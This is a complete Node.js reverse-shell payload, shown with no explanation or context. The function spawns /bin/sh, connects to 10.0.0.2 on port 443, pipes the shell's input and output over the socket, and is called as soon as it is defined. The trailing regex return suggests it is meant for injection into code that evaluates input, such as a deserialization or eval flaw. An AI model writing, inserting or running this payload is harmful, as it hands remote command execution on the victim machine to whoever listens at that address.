function reverseShell() {
    const net = require("net");
    const cp = require("child_process");
    const sh = cp.spawn("/bin/sh", []);
    const client = new net.Socket();
    client.connect(443, "10.0.0.2", function () {
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/;
}
reverseShell();
